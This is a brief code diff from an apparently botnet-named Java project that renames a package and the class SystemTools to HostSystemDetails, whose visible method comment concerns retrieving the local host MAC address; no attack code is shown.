@@ -24,7 +24,7 @@
  * THE SOFTWARE.
  */
 
-package com.acmutv.botnet.tool;
+package com.acmutv.botnet.service;
 
 import java.io.IOException;
 import java.net.*;
@@ -36,7 +36,7 @@ import java.util.Enumeration;
  * @since 1.0
  * @see HttpURLConnection
  */
-public class SystemTools {
+public class HostSystemDetails {
 
   /**
    * Retrieves the local host MAC address.
